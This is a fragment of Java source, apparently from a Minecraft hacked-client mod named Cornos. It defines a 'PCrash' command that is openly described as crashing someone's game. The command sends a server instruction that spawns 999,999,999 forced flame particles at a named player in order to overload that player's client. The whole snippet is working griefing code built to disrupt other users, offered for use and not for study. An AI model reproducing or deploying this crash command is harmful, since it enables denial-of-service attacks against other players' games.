...
public class CrashPlayer extends Command {
	public CrashPlayer() {
		super("PCrash", "crash someones game [NEEDS OP]",
				new String[]{"pCrash", "pcrash", "crashplayer", "CrashPlayer"});
	}
	...
	public void onExecute(String[] args) {
		...
		Cornos.minecraft.player.sendChatMessage(
				"/execute as " + args[0] + " at @s run particle flame ~ ~ ~ 1 1 1 0 999999999 force @s"); // add
		// particles
		// to their
		// client
